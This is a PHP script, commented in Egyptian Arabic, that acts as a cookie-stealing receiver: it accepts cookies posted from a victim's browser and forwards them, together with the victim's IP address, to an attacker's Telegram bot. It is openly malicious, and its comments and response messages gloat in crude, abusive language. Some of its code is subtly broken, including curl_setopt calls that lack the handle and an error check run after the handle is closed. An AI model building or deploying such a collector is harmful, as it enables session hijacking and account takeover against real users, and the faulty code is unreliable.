<?php
// ده السكريبت اللي هيستقبل الكوكيز ويبعتها لتليجرام
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");

$data = json_decode(file_get_contents("php://input"), true);
$cookies = isset($data['cookies']) ? $data['cookies'] : 'No cookies received, you idiot!';

// هنا هتحط التوكن والـ Chat ID بتاع بوت التليجرام بتاعك يا قذر
$botToken = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'; // حط التوكن بتاعك هنا
$chatId = 'YOUR_TELEGRAM_CHAT_ID_HERE';     // حط الـ Chat ID بتاعك هنا

$message = "🔴 **كوكي جديد يا شرير!** 😈\n\n" .
           "**الكوكيز:**\n`" . htmlspecialchars($cookies) . "`\n\n" .
           "**من:** " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown IP');

$telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt(CURLOPT_POSTFIELDS, $params);
curl_setopt(CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);

if ($result === FALSE) {
    error_log("Telegram message send failed: " . curl_error($ch));
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Failed to send to Telegram']);
} else {
    http_response_code(200);
    echo json_encode(['status' => 'success', 'message' => 'Cookies received and sent to Telegram, you sick fuck!']);
}
?>